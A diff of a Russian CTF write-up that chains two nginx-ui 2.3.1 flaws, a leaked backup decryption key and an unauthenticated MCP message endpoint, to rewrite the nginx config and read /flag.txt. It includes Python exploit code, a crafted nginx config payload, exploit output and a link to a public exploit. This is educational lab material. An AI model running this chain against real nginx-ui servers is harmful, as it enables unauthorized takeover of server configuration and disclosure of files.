@@ -3,97 +3,164 @@
 > **Категория:** `web`  
 > **CTF:** KubSTU CTF 2026 Spring
 
----
+## Описание
 
-Описание
-«CapyTech Solutions» утверждает, что их AI понимает команды с полуслова. Вы можете просто сказать: «Перезапусти Nginx!», и сервер послушается.
-Writeup
-Введение
-Данный райтап описывает решение CTF-задания "Capy CTF: The Secret Node", основанного на цепочке из двух критических уязвимостей в nginx-ui версии 2.3.1. Цель задания - получить флаг, расположенный в файле /flag.txt внутри контейнера nginx_ui, используя эти уязвимости для достижения удаленного выполнения кода (RCE) или раскрытия файлов.
-Обзор уязвимостей
+«CapyTech Solutions» утверждает, что их AI понимает команды с 
+полуслова. Вы можете просто сказать: «Перезапусти Nginx!», и сервер 
+послушается.
+
+# Writeup
+
+## Введение
+
+Данный райтап описывает решение CTF-задания "Capy CTF: The Secret Node", основанного на цепочке из двух критических уязвимостей в `nginx-ui` версии 2.3.1. Цель задания - получить флаг, расположенный в файле `/flag.txt` внутри контейнера `nginx_ui`, используя эти уязвимости для достижения удаленного выполнения кода (RCE) или раскрытия файлов.
+
+## Обзор уязвимостей
+
 CTF-задание эксплуатирует следующую цепочку уязвимостей:
-1. CVE-2026-27944: Неаутентифицированный бэкап и раскрытие ключа
-Уязвимость CVE-2026-27944 позволяет неаутентифицированному пользователю получить доступ к эндпоинту /api/backup. Этот эндпоинт возвращает зашифрованный архив, содержащий полную резервную копию установки nginx-ui, включая файл app.ini. Критическая особенность заключается в том, что ключ и вектор инициализации (IV) для расшифровки AES-256-CBC передаются в открытом виде в заголовке ответа X-Backup-Security.
-Расшифровав архив с помощью полученных ключей, можно извлечь файл app.ini, который содержит Node.Secret - секрет, необходимый для эксплуатации следующей уязвимости.
-по дробнее тут https://github.com/advisories/GHSA-g9w5-qffc-6762
-2. CVE-2026-33032 ("MCPwn"): Неаутентифицированный обработчик сообщений MCP
-Уязвимость CVE-2026-33032, также известная как "MCPwn", связана с отсутствием проверки аутентификации (AuthRequired() middleware) в эндпоинте /mcp_message. nginx-ui использует протокол MCP (Model Context Protocol) для управления Nginx, предоставляя 12 привилегированных инструментов управления.
-Используя Node.Secret, полученный на первом этапе, злоумышленник может установить неаутентифицированную SSE-сессию с /mcp для получения sessionId. Затем, отправляя POST-запросы на /mcp_message с этим sessionId, можно вызывать любые привилегированные инструменты MCP без какой-либо аутентификации. Это позволяет перезаписывать конфигурационные файлы Nginx (nginx_config_modify) и перезагружать сервер (reload_nginx), что приводит к удаленному выполнению кода или раскрытию файлов.
-Цепочка уязвимостей
-CVE-2026-27944 — Неаутентифицированная конечная точка резервного копирования + раскрытие ключа
-GET /api/backup не требует аутентификации. Эта конечная точка возвращает полную зашифрованную резервную копию установки nginx-ui — включая app.ini — и отправляет ключ дешифрования AES-256-CBC и вектор инициализации (IV) в открытом виде в заголовке ответа:
+
+### 1. CVE-2026-27944: Неаутентифицированный бэкап и раскрытие ключа
+
+Уязвимость CVE-2026-27944 позволяет неаутентифицированному пользователю получить доступ к эндпоинту `/api/backup`. Этот эндпоинт возвращает зашифрованный архив, содержащий полную резервную копию установки `nginx-ui`, включая файл `app.ini`. Критическая особенность заключается в том, что ключ и вектор инициализации (IV) для расшифровки AES-256-CBC передаются в открытом виде в заголовке ответа `X-Backup-Security`.
+
+Расшифровав архив с помощью полученных ключей, можно извлечь файл `app.ini`, который содержит `Node.Secret` - секрет, необходимый для эксплуатации следующей уязвимости.
+
+по дробнее тут <https://github.com/advisories/GHSA-g9w5-qffc-6762>
+
+### 2. CVE-2026-33032 ("MCPwn"): Неаутентифицированный обработчик сообщений MCP
+
+Уязвимость CVE-2026-33032, также известная как "MCPwn", связана с отсутствием проверки аутентификации (`AuthRequired()` middleware) в эндпоинте `/mcp_message`. `nginx-ui` использует протокол MCP (Model Context Protocol) для управления Nginx, предоставляя 12 привилегированных инструментов управления.
+
+Используя `Node.Secret`, полученный на первом этапе, злоумышленник может установить неаутентифицированную SSE-сессию с `/mcp` для получения `sessionId`. Затем, отправляя POST-запросы на `/mcp_message` с этим `sessionId`, можно вызывать любые привилегированные инструменты MCP без какой-либо аутентификации. Это позволяет перезаписывать конфигурационные файлы Nginx (`nginx_config_modify`) и перезагружать сервер (`reload_nginx`), что приводит к удаленному выполнению кода или раскрытию файлов.
+
+## Цепочка уязвимостей
+
+### CVE-2026-27944 — Неаутентифицированная конечная точка резервного копирования + раскрытие ключа
+
+`GET /api/backup` не требует аутентификации. Эта конечная точка возвращает полную зашифрованную резервную копию установки nginx-ui — включая `app.ini` — и отправляет ключ дешифрования AES-256-CBC и вектор инициализации (IV) **в открытом виде** в заголовке ответа:
+
+```
 X-Backup-Security: <base64_key>:<base64_iv>
+```
+
+```go
 r.GET("/backup", CreateBackup)   // ❌ нет middleware
 r.POST("/restore", middleware.EncryptedForm(), RestoreBackup)
-Из исходного кода (api/backup/router.go):
-Расшифровка резервной копии даёт app.ini, который содержит [node] Secret, необходимый для шага 2.
-CVE-2026-33032 «MCPwn» — Неаутентифицированный обработчик MCP сообщений
-В nginx-ui v2.3.x был добавлен интерфейс Model Context Protocol (MCP), предоставляющий 12 инструментов управления nginx. Ошибка заключается в одном пропущенном вызове middleware в mcp/router.go:
+```
+
+Из исходного кода (`api/backup/router.go`):
+
+Расшифровка резервной копии даёт `app.ini`, который содержит `[node] Secret`, необходимый для шага 2.
+
+### CVE-2026-33032 «MCPwn» — Неаутентифицированный обработчик MCP сообщений
+
+В nginx-ui v2.3.x был добавлен интерфейс **Model Context Protocol (MCP)**, предоставляющий 12 инструментов управления nginx. Ошибка заключается в одном пропущенном вызове middleware в `mcp/router.go`:
+
+```go
 r.Any("/mcp",         middleware.IPWhiteList(), middleware.AuthRequired(), ...)
 r.Any("/mcp_message", middleware.IPWhiteList(), ...)   // ❌ ПРОПУЩЕН AuthRequired()
-Как работает связка
-Имея sessionId, полученный с помощью секрета узла, злоумышленник может отправить POST-запрос на /mcp_message без каких-либо учётных данных и вызвать любой привилегированный инструмент — включая nginx_config_modify и reload_nginx.
+```
+
+### Как работает связка
+
+---
+
+Имея `sessionId`, полученный с помощью секрета узла, злоумышленник может отправить POST-запрос на `/mcp_message` без каких-либо учётных данных и вызвать любой привилегированный инструмент — включая `nginx_config_modify` и `reload_nginx`.
+
+---
+
+ ![img_1.png](./images/img_1.png)
 
 ## Решение
 
-Этап 1: Извлечение `Node.Secret` (CVE-2026-27944)
-Первый шаг - получить Node.Secret из app.ini. Это достигается путем отправки неаутентифицированного GET-запроса к /api/backup на nginx-ui (порт 9000). В заголовке X-Backup-Security ответа будут содержаться base64-кодированные AES-ключ и IV. Затем необходимо:
-Декодировать ключ и IV из base64.
-Расшифровать полученный зашифрованный ZIP-архив, используя AES в режиме CBC с полученными ключом и IV.
-Извлечь файл app.ini из расшифрованного архива.
-Прочитать значение Secret из секции [node] файла app.ini.
-В данном CTF Node.Secret будет
-подробнее про уязвимость в https://github.com/advisories/GHSA-g9w5-qffc-6762
-но есть готоывый эксплоит для получения Node.Secret  https://github.com/Skynoxk/CVE-2026-27944
+### Этап 1: Извлечение `Node.Secret` (CVE-2026-27944)
+
+---
+
+Первый шаг - получить `Node.Secret` из `app.ini`. Это достигается путем отправки неаутентифицированного GET-запроса к `/api/backup` на `nginx-ui` (порт 9000). В заголовке `X-Backup-Security` ответа будут содержаться base64-кодированные AES-ключ и IV. Затем необходимо:
+
+1. Декодировать ключ и IV из base64.
+2. Расшифровать полученный зашифрованный ZIP-архив, используя AES в режиме CBC с полученными ключом и IV.
+3. Извлечь файл `app.ini` из расшифрованного архива.
+4. Прочитать значение `Secret` из секции `[node]` файла `app.ini`.
+
+В данном CTF `Node.Secret` будет 
+
+подробнее про уязвимость в <https://github.com/advisories/GHSA-g9w5-qffc-6762>
+
+но есть готоывый эксплоит для получения `Node.Secret`  <https://github.com/Skynoxk/CVE-2026-27944>
+
+```javascript
 [*] CVE-2026-27944 — downloading backup from Nginx-UI (no auth)
 [+] AES key+IV from header: 7jeJX3Ph8q4/IpdY...:nuPm7h3U...
 [+] Node secret extracted: sicret-ctf-capy-key-2026
+```
 
-Этап 2: Модификация конфигурации Nginx и получение флага (CVE-2026-33032)
-Класс MCPSession и функция mcp_swap реализуют этот этап:
-Установление MCP-сессии: Создается объект MCPSession с base_url и node_secret. Метод connect() отправляет GET запрос к f"{self.base_url}/mcp" с параметром node_secret. В ответном SSE-потоке парсится sessionId.
-self._sse_resp = requests.get(
-    f"{self.base_url}/mcp",
-    params={"node_secret": self.node_secret},
-    stream=True, timeout=5,
-)
-# ... парсинг sessionId из SSE-потока
-Модификация конфигурации Nginx: Метод call_tool используется для отправки POST запроса к f"{self.base_url}/mcp_message" с полученным sessionId. В качестве payload передается JSON-RPC запрос, вызывающий метод nginx_config_modify.
-# ... внутри mcp_swap
-r = sess.call_tool(
-    "nginx_config_modify",
-    {"relative_path": config_file, "content": new_content, "sync_overwrite": False},
-    msg_id=2,
-)
-Пейлоад для nginx_config_modify: new_content - это строка, содержащая новую конфигурацию Nginx. Для получения флага используется следующий FLAG_CONFIG:
-server {
-    listen 80;
-    server_name localhost;
+### Этап 2: Модификация конфигурации Nginx и получение флага (CVE-2026-33032)
 
-    location / {
-        proxy_pass http://webapp:80;
-        proxy_set_header Host $host;
-        proxy_set_header X-Real-IP $remote_addr;
-        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
-        proxy_set_header X-Forwarded-Proto $scheme;
-    }
+Класс `MCPSession` и функция `mcp_swap` реализуют этот этап:
 
-    location /flag {
-        alias /flag.txt;
-        internal;
-    }
+1. **Установление MCP-сессии**: Создается объект `MCPSession` с `base_url` и `node_secret`. Метод `connect()` отправляет `GET` запрос к `f"{self.base_url}/mcp"` с параметром `node_secret`. В ответном SSE-потоке парсится `sessionId`.
 
-    location /get_flag {
-        rewrite ^ /flag break;
-    }
-}
-location /flag { alias /flag.txt; internal; }: Этот блок указывает Nginx, что при запросе /flag нужно отдать содержимое файла /flag.txt. Директива internal делает этот location доступным только для внутренних редиректов или субзапросов внутри Nginx, предотвращая прямой доступ извне.
-location /get_flag { rewrite ^ /flag break; }: Этот блок создает публично доступный эндпоинт /get_flag. Директива rewrite ^ /flag break; переписывает URL /get_flag на /flag и останавливает дальнейшую обработку правил перезаписи. Поскольку /flag является internal, Nginx внутренне обрабатывает его, отдавая содержимое /flag.txt через публичный эндпоинт /get_flag.
-Перезагрузка Nginx: После изменения конфигурации, вызывается метод reload_nginx через call_tool для применения изменений. Это критически важно, так как Nginx не применяет изменения конфигурации до перезагрузки.
-r = sess.call_tool("reload_nginx", {}, msg_id=3)
-Получение флага: После успешной перезагрузки Nginx, скрипт отправляет GET запрос к f"{webapp_url}/get_flag" (например, http://localhost:8080/get_flag). Поскольку webapp теперь обслуживает модифицированную конфигурацию Nginx, этот запрос вернет содержимое /flag.txt.
-flag_resp = requests.get(f"{webapp_url}/get_flag", timeout=10)
-flag = flag_resp.text.strip()
+   ```python
+   self._sse_resp = requests.get(
+       f"{self.base_url}/mcp",
+       params={"node_secret": self.node_secret},
+       stream=True, timeout=5,
+   )
+   # ... парсинг sessionId из SSE-потока
+   ```
+2. **Модификация конфигурации Nginx**: Метод `call_tool` используется для отправки `POST` запроса к `f"{self.base_url}/mcp_message"` с полученным `sessionId`. В качестве `payload` передается JSON-RPC запрос, вызывающий метод `nginx_config_modify`.
+
+   ```python
+   # ... внутри mcp_swap
+   r = sess.call_tool(
+       "nginx_config_modify",
+       {"relative_path": config_file, "content": new_content, "sync_overwrite": False},
+       msg_id=2,
+   )
+   ```
+
+   **Пейлоад для** `nginx_config_modify`: `new_content` - это строка, содержащая новую конфигурацию Nginx. Для получения флага используется следующий `FLAG_CONFIG`:
+
+   ```nginx
+   server {
+       listen 80;
+       server_name localhost;
+   
+       location / {
+           proxy_pass http://webapp:80;
+           proxy_set_header Host $host;
+           proxy_set_header X-Real-IP $remote_addr;
+           proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+           proxy_set_header X-Forwarded-Proto $scheme;
+       }
+   
+       location /flag {
+           alias /flag.txt;
+           internal;
+       }
+   
+       location /get_flag {
+           rewrite ^ /flag break;
+       }
+   }
+   ```
+   - `location /flag { alias /flag.txt; internal; }`: Этот блок указывает Nginx, что при запросе `/flag` нужно отдать содержимое файла `/flag.txt`. Директива `internal` делает этот `location` доступным только для внутренних редиректов или субзапросов внутри Nginx, предотвращая прямой доступ извне.
+   - `location /get_flag { rewrite ^ /flag break; }`: Этот блок создает публично доступный эндпоинт `/get_flag`. Директива `rewrite ^ /flag break;` переписывает URL `/get_flag` на `/flag` и останавливает дальнейшую обработку правил перезаписи. Поскольку `/flag` является `internal`, Nginx внутренне обрабатывает его, отдавая содержимое `/flag.txt` через публичный эндпоинт `/get_flag`.
+3. **Перезагрузка Nginx**: После изменения конфигурации, вызывается метод `reload_nginx` через `call_tool` для применения изменений. Это критически важно, так как Nginx не применяет изменения конфигурации до перезагрузки.
+
+   ```python
+   r = sess.call_tool("reload_nginx", {}, msg_id=3)
+   ```
+4. **Получение флага**: После успешной перезагрузки Nginx, скрипт отправляет `GET` запрос к `f"{webapp_url}/get_flag"` (например, `http://localhost:8080/get_flag`). Поскольку `webapp` теперь обслуживает модифицированную конфигурацию Nginx, этот запрос вернет содержимое `/flag.txt`.
+
+   ```python
+   flag_resp = requests.get(f"{webapp_url}/get_flag", timeout=10)
+   flag = flag_resp.text.strip()
+   ```
+
+```javascript
 import argparse
 import base64
 import configparser
@@ -190,7 +257,6 @@ def extract_node_secret(base_url: str) -> str:
     print(f"[+] Node secret extracted: {secret}")
     return secret
 
-![изображение.png](./images/img_1.png)
 
 # CVE-2026-33032: unauthenticated MCP → nginx config overwrite
 
@@ -367,5 +433,7 @@ def main() -> None:
 
 if __name__ == "__main__":
     main()
+```
 
-Флаг: KubSTU(mcp_h4s_n0_4uth_4nd_1_l0v3_1t)
+
+Флаг: `KubSTU(mcp_h4s_n0_4uth_4nd_1_l0v3_1t)`
